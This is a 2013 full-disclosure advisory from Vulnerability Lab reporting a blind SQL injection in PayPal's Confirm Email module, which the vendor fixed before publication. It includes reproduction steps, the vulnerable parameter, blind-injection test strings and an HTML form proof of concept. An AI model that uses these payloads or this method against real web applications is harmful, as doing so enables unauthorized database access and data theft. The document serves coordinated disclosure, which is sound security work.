
Date: Tue, 22 Jan 2013 16:26:56 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: full-disclosure@...ts.grok.org.uk
Subject: Paypal Bug Bounty #18 - Blind SQL Injection
	Vulnerability

Title:
======
Paypal Bug Bounty #18 - Blind SQL Injection Vulnerability


Date:
=====
2013-01-22


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=673

http://news.softpedia.com/news/PayPal-Addresses-Blind-SQL-Injection-Vulnerability-After-Being-Notified-by-Experts-323053.shtml


VL-ID:
=====
673


Common Vulnerability Scoring System:
====================================
8.3


Introduction:
=============
PayPal is a global e-commerce business allowing payments and money transfers to be made through the Internet. Online money 
transfers serve as electronic alternatives to paying with traditional paper methods, such as checks and money orders. Originally, 
a PayPal account could be funded with an electronic debit from a bank account or by a credit card at the payer s choice. But some 
time in 2010 or early 2011, PayPal began to require a verified bank account after the account holder exceeded a predetermined 
spending limit. After that point, PayPal will attempt to take funds for a purchase from funding sources according to a specified 
funding hierarchy. If you set one of the funding sources as Primary, it will default to that, within that level of the hierarchy 
(for example, if your credit card ending in 4567 is set as the Primary over 1234, it will still attempt to pay money out of your 
PayPal balance, before it attempts to charge your credit card). The funding hierarchy is a balance in the PayPal account; a 
PayPal credit account, PayPal Extras, PayPal SmartConnect, PayPal Extras Master Card or Bill Me Later (if selected as primary 
funding source) (It can bypass the Balance); a verified bank account; other funding sources, such as non-PayPal credit cards.
The recipient of a PayPal transfer can either request a check from PayPal, establish their own PayPal deposit account or request 
a transfer to their bank account.

PayPal is an acquirer, performing payment processing for online vendors, auction sites, and other commercial users, for which it 
charges a fee. It may also charge a fee for receiving money, proportional to the amount received. The fees depend on the currency 
used, the payment option used, the country of the sender, the country of the recipient, the amount sent and the recipient s account 
type. In addition, eBay purchases made by credit card through PayPal may incur extra fees if the buyer and seller use different currencies.

On October 3, 2002, PayPal became a wholly owned subsidiary of eBay. Its corporate headquarters are in San Jose, California, United 
States at eBay s North First Street satellite office campus. The company also has significant operations in Omaha, Nebraska, Scottsdale, 
Arizona, and Austin, Texas, in the United States, Chennai, Dublin, Kleinmachnow (near Berlin) and Tel Aviv. As of July 2007, across 
Europe, PayPal also operates as a Luxembourg-based bank.

On March 17, 2010, PayPal entered into an agreement with China UnionPay (CUP), China s bankcard association, to allow Chinese consumers 
to use PayPal to shop online.PayPal is planning to expand its workforce in Asia to 2,000 by the end of the year 2010.
Between December 4Ã±9, 2010, PayPal services were attacked in a series of denial-of-service attacks organized by Anonymous in retaliation 
for PayPal s decision to freeze the account of WikiLeaks citing terms of use violations over the publication of leaked US diplomatic cables.

(Copy of the Homepage: www.paypal.com) [http://en.wikipedia.org/wiki/PayPal]


Abstract:
=========
The Vulnerability Laboratory Research Team discovered a critical Web Vulnerability in the official Paypal ecommerce website application.


Report-Timeline:
================
2012-08-01:	Researcher Notification & Coordination
2012-08-01:	Vendor Notification
2012-08-07:	Vendor Response/Feedback #1
2012-08-07:	Vendor Response/Feedback #2
2012-12-04:	Vendor Response/Feedback #3
2013-01-12:	Vendor Fix/Patch
2013-01-22:	Public Disclosure


Status:
========
Published


Affected Products:
==================
PayPal Inc
Product: Core Application 2012 Q4


Exploitation-Technique:
=======================
Remote


Severity:
=========
Critical


Details:
========
A blind SQL Injection vulnerability is detected in the official Paypal ecommerce website application.
The vulnerability allows remote attackers or local low privileged application user account to inject/execute 
(blind) own sql commands on the affected application dbms. The vulnerability is located in the Confirm 
Email module with the bound vulnerable id input field.

The validation of the confirm number input field is watching all the context since the first valid number matches. 
The attacker uses a valid number and includes the statement after it to let both pass through the paypal application 
filter. The result is the successful execution of the sql command when the module is processing to reload the page module.

Exploitation of the vulnerability requires a low privileged application user account to access the website area and can 
processed without user interaction. Successful exploitation of the vulnerability results in web application or module 
compromise via blind sql injection attack.

Vulnerable Service(s):
                                            [+] Paypal Inc - Core Application (www.paypal.com)

Vulnerable Module(s):
                                            [+] Confirm Email

Vulnerable Section(s):
                                            [+] Confirm Number (Verification) - Input Field

Vulnerable Parameter(s):
                                            [+] login_confirm_number_id - login_confirm_number


Proof of Concept:
=================
The blind sql injection vulnerability can be exploited by remote attackers with low privileged application user account and 
without required user interaction. For demonstration or reproduce ...

URL1: Request a Session with 2 different mails (Step1)
https://www.paypal.com/de/ece/cn=06021484023174514599&em=admin@vulnerabiliuty-lab.com
https://www.paypal.com/de/ece/cn=06021484023174514599&em=01x445@gmail.com

URL2: Injection into ID Confirm Field (Step2)
https://www.paypal.com/de/cgi-bin/webscr?cmd=_confirm-email-password-submit&
dispatch=5885d80a13c0db1f8e263663d3faee8d7283e7f0184a5674430f290db9e9c846

1. Open the website of paypal and login as standard user with a restricted account
2. Switch to the webscr > Confirm Email module of the application
3. Request a login confirm id when processing to load a reset
4. Take the valid confirm number of the mail and insert it into the email confirm number verification module input fields
5. Switch to the last char of the valid confirm number in the input field and inject own sql commands as check to proof the validation

Test Strings:
-1+AND+IF(SUBSTRING(VERSION(),1,1)=$i,1,2)=1-1'
-1'+AND+IF(SUBSTRING(VERSION(),1,1)=$i,1,2)=1--1'
1+AND+IF(SUBSTRING(VERSION(),1,1)=$i,1,2)=1
1+AND+IF(SUBSTRING(VERSION(),1,1)=$i,1,2)=-1'

6. Normally the website with the generated ID confirm button is bound to the standard template.
7. Inject substrings with the id -1+sql-query to proof for blind injections in the input field 
8. The bottom bar gets loaded as result for the successful executed sql query
8. Now, the remote attacker can manipulate the paypal core database with a valid confirm number + his own sql commands

Bug Type: 	Blind SQL INJECTION [POST] Injection Vulnerability
SESSION: 	DE - 22:50 -23:15 (paypal.com)
Browser: 	Mozilla Firefox 14.01

PoC:
<form method="post" action="https://www.paypal.com/de/cgi-bin/webscr?cmd=_confirm-email-submit&
dispatch=5885d80a13c0db1f8e263663d3faee8d7283e7f0184a5674430f290db9e9c846" class="">
<p class="group"><label for="login_confirm_number_id"><span class="labelText"><span class="error">
Please enter it here</span></span></label><span class="field"><input id="login_confirm_number_id" class="xlarge" 
name="login_confirm_number" value="06021484023174514599-1+[BLIND SQL-INJECTION!]--" type="text"></span></p><p class="buttons">
<input name="confirm.x" value="Confirm" class="button primary" type="submit"></p><input name="form_charset" 
value="UTF-8" type="hidden"></form>

Note: Do all requests ever with id to reproduce the issue. (-) is not possible as first char of the input request. 

Example(Wrong): -1+[SQL-Injection]&06021484023183514599
Example(Right): 06021484023183514599-1+[SQL-Injection]--
Example(Right): 06021484023183514599-1+AND+IF(SUBSTRING(VERSION(),1,1)=$i,1,2)=1-1'-1'--

Test Mail(s): 
			[+] 01x221@...il.com and admin@...nerability-lab.com


Note:
After inject was successful 2 times because of my check, the paypal website opened a security issue report message box as exception-handling. 
I included the details and information of my test and explained the issue and short time later it has been patched.


Solution:
=========
2013-01-12:	Vendor Fix/Patch


Risk:
=====
The security risk of the blind sql injection web vulnerability in the paypal core application is estimated as critical.


Credits:
========
Vulnerability Laboratory [Research Team]  -    Benjamin Kunz Mejri (bkm@...nerability-lab.com)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases 
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register
Contact:    admin@...nerability-lab.com 	- support@...nerability-lab.com 	       - research@...nerability-lab.com
Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and 
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
modify, use or edit our material contact (admin@...nerability-lab.com or support@...nerability-lab.com) to get a permission.

    				   	Copyright Â© 2012 | Vulnerability Laboratory



-- 
VULNERABILITY RESEARCH LABORATORY
LABORATORY RESEARCH TEAM
CONTACT: research@...nerability-lab.com


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
